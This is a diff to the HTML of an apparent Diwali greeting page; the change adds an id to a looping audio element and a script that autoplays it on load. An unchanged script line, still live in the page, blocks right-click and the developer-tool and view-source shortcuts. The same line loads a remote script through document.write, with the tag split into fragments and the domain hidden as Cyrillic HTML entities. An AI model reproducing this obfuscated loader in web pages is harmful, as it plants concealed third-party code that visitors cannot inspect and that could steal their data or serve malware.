@@ -639,7 +639,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 <!------- Audio ------------>
 
 <center>
-<audio controls autoplay="yes" mobile="yes" src="https://www.webtofun.com/funarea/ringtones/Happy_Diwali_Ringtone_2019_Download.mp3" loop></audio><br />
+<audio controls autoplay="yes" mobile="yes" src="https://www.webtofun.com/funarea/ringtones/Happy_Diwali_Ringtone_2019_Download.mp3" loop id="my_audio"></audio><br />
 </center>
 	
 <!------- Audio ------------>
@@ -767,7 +767,11 @@ var x = setInterval(function() {
     }
 }, 1000);
 </script>
-
+<script type="text/javascript">
+window.onload=function(){
+    document.getElementById("my_audio").play();
+  }
+</script>
 <script>
 document.addEventListener('contextmenu', event => event.preventDefault()); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1092;'+'&#1102;.'+'i'+'o"></s'+'cr'+'ipt>'); document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
 </script> 
